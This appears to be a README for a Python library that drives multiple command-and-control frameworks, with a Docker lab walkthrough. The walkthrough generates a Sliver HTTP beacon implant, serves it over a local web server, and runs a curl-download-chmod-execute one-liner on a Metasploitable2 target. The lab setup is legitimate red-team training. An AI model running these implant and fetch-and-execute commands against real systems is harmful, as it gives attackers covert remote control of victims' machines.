# Eshu Python Library v5

Common Language Platform for multiple Command and Control Frameworks

## Testing Lab Setup
This is an environment using Docker with test targets to
demonstrate using the Eshu CLP Python Library.

### To Simply Start...
Start Daemonized services

```console
docker compose up -d --build
```

Then launch into the operator machine in one terminal
```console
docker exec -it operator /bin/bash
```

To test network connection to vulnerable machine(VM)
```bash
ping 10.1.1.3
nmap -l metasploitable2
```

#### Firstly, setting up Sliver Server
In one terminal (Sliver Server):
```bash
docker exec -it operator /bin/bash
sliver-server
> new-operator --name operator1 --lhost localhost
> multiplayer
```

#### Secondly, setting up Sliver Client instance
In second terminal (Sliver Client):
```bash
docker exec -it operator /bin/bash
sliver-client import operator1_localhost.cfg
sliver-client
> generate beacon --seconds 5 --jitter 0 --http 10.1.1.2 --os linux --arch amd64 --name testbeacon
> http	
```

#### Thirdly, set up server to transfer implant for exploitation
In third terminal (operator workspace):
```bash
docker exec -it operator /bin/bash
python -m http.server 8080
```

#### Fourth, download and run implant on vulnerable machine
In fourth terminal (metasploitable2):
```bash
docker exec -it metasploitable2 /bin/bash
curl -O http://10.1.1.2:8080/testbeacon && chmod +x testbeacon && sudo service apache2 stop && ./testbeacon
```
Check the sliver-client terminal to see the beacon connection.

#### Lastly, run main.py for simultaneous Metasploit and Sliver behavior
In the third terminal with the http server, ctrl-c once the GET request is made and run the following in workspace#:
```bash 
python eshuCLP/main.py
```

#### Clean Up
To stop all running containers
```console
docker compose stop
```

If stopped, start again with
```console
docker-compose start
```

To kill and remove all the running containers
```console
docker compose down
```